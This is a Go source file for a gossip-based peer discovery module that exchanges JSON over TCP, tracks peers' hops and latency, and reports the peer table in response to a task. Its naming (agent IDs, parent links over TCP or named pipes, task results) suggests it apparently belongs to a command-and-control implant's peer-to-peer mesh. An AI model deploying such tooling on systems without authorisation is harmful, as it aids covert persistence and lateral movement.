//go:build linux || windows || darwin
// +build linux windows darwin

package main

import (
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"strings"
	"sync"
	"time"
)

type GossipData struct {
	AgentID string  `json:"agent_id"`
	Addr    string  `json:"addr"`
	Mode    string  `json:"mode"`
	Hops    int     `json:"hops"`
	Latency float64 `json:"latency_ms"`
}

type PeerInfo struct {
	AgentID  string    `json:"agent_id"`
	Addr     string    `json:"addr"`
	Mode     string    `json:"mode"`
	LastSeen time.Time `json:"last_seen"`
	Hops     int       `json:"hops"`
	Latency  float64   `json:"latency_ms"`
}

var (
	peerTable        map[string]PeerInfo
	peerTableMu      sync.RWMutex
	gossipRunning    bool
	lastGossipReport time.Time
)

func init() {
	peerTable = make(map[string]PeerInfo)
}

func startGossipProtocol() {
	if !GossipEnabled {
		return
	}
	gossipRunning = true

	probeKnownPeers()

	ticker := time.NewTicker(time.Duration(GossipInterval) * time.Second)
	defer ticker.Stop()

	pruneTicker := time.NewTicker(5 * time.Minute)
	defer pruneTicker.Stop()

	for {
		select {
		case <-ticker.C:
			broadcastGossip()
		case <-pruneTicker.C:
			peerTablePrune()
		}
	}
}

func probeKnownPeers() {
	if P2PParent != "" {
		addr := strings.TrimPrefix(P2PParent, "tcp://")
		addr = strings.TrimPrefix(addr, "pipe://")
		if addr != "" {
			gossipProbePeer(addr)
		}
	}
	if P2PListenAddr != "" {
		addr := strings.TrimPrefix(P2PListenAddr, "tcp://")
		peerTableMu.Lock()
		peerTable[agentUUID] = PeerInfo{
			AgentID:  agentUUID,
			Addr:     addr,
			Mode:     P2PMode,
			LastSeen: time.Now(),
			Hops:     0,
			Latency:  0,
		}
		peerTableMu.Unlock()
	}
}

func broadcastGossip() {
	peerTableMu.RLock()
	peers := make([]PeerInfo, 0, len(peerTable))
	for _, p := range peerTable {
		if p.AgentID != agentUUID {
			peers = append(peers, p)
		}
	}
	peerTableMu.RUnlock()

	for _, peer := range peers {
		go gossipProbePeer(peer.Addr)
	}
}

func gossipProbePeer(addr string) {
	if addr == "" {
		return
	}
	conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
	if err != nil {
		return
	}
	defer conn.Close()

	start := time.Now()

	gd := GossipData{
		AgentID: agentUUID,
		Addr:    P2PListenAddr,
		Mode:    P2PMode,
		Hops:    0,
	}
	body, _ := json.Marshal(gd)
	if err := binary.Write(conn, binary.BigEndian, uint32(len(body))); err != nil {
		return
	}
	if _, err := conn.Write(body); err != nil {
		return
	}

	var rlen uint32
	conn.SetReadDeadline(time.Now().Add(5 * time.Second))
	if err := binary.Read(conn, binary.BigEndian, &rlen); err != nil {
		return
	}
	if rlen == 0 || rlen > 64*1024 {
		return
	}
	rbuf := make([]byte, rlen)
	if _, err := io.ReadFull(conn, rbuf); err != nil {
		return
	}
	latency := time.Since(start).Seconds() * 1000

	var resp GossipData
	if err := json.Unmarshal(rbuf, &resp); err != nil {
		return
	}
	handleGossipResponse(resp, latency)
}

func handleGossipResponse(data GossipData, latency float64) {
	if data.AgentID == "" || data.AgentID == agentUUID {
		return
	}
	peerTableMu.Lock()
	defer peerTableMu.Unlock()

	existing, ok := peerTable[data.AgentID]
	if ok {
		// Always refresh LastSeen so an active peer is never pruned just
		// because its advertised route is not better than the recorded one.
		existing.LastSeen = time.Now()
		peerTable[data.AgentID] = existing
	}
	if !ok || data.Hops < existing.Hops {
		peerTable[data.AgentID] = PeerInfo{
			AgentID:  data.AgentID,
			Addr:     data.Addr,
			Mode:     data.Mode,
			LastSeen: time.Now(),
			Hops:     data.Hops + 1,
			Latency:  latency,
		}
	}
}

func peerTablePrune() {
	peerTableMu.Lock()
	defer peerTableMu.Unlock()

	cutoff := time.Now().Add(-10 * time.Minute)
	for id, info := range peerTable {
		if info.LastSeen.Before(cutoff) {
			delete(peerTable, id)
		}
	}
}

func handleGossipDiscover(task Task, res *TaskResult) {
	peerTableMu.RLock()
	peers := make([]PeerInfo, 0, len(peerTable))
	for _, p := range peerTable {
		peers = append(peers, p)
	}
	peerTableMu.RUnlock()

	data, err := json.Marshal(peers)
	if err != nil {
		res.Error = "failed to marshal peer table: " + err.Error()
		return
	}
	res.Output = string(data)
}

func gossipListen() {
	ln, err := net.Listen("tcp", GossipListenAddr)
	if err != nil {
		if Debug {
			fmt.Printf("[!] Gossip listen on %s failed: %v\n", GossipListenAddr, err)
		}
		return
	}
	defer ln.Close()
	for {
		conn, err := ln.Accept()
		if err != nil {
			continue
		}
		go handleGossipConn(conn)
	}
}

func handleGossipConn(conn net.Conn) {
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(30 * time.Second))

	var rlen uint32
	if err := binary.Read(conn, binary.BigEndian, &rlen); err != nil {
		return
	}
	if rlen == 0 || rlen > 64*1024 {
		return
	}
	body := make([]byte, rlen)
	if _, err := io.ReadFull(conn, body); err != nil {
		return
	}

	var req GossipData
	if err := json.Unmarshal(body, &req); err != nil {
		return
	}

	handleGossipResponse(req, 0)

	resp := GossipData{
		AgentID: agentUUID,
		Addr:    P2PListenAddr,
		Mode:    P2PMode,
		Hops:    0,
	}
	respBody, _ := json.Marshal(resp)
	conn.SetDeadline(time.Now().Add(10 * time.Second))
	binary.Write(conn, binary.BigEndian, uint32(len(respBody)))
	conn.Write(respBody)
}
